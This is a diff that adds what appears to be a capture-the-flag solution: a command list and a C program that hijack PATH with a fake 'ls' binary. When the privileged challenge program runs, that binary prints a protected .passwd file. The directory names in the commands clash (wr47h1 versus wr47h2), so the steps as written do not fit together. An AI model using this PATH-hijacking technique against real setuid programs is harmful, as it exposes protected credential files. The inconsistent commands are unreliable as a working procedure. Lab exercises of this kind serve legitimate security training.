@@ -1,0 +1,24 @@
+Commands List
+-------------
+
+mkdir /tmp/wr47h1
+cd /tmp/wr47h2
+vi a.c
+g++ a.c -o a
+mv /tmp/wr47h2/a /tmp/wr47h2/ls
+cd -
+export PATH="/tmp/wr47h1:$PATH"
+./ch12
+
+
+
+a.c
+---
+
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc, char  *argv[]){
+       system("cat /challenge/app-script/ch12/.passwd");
+       return 0;
+}
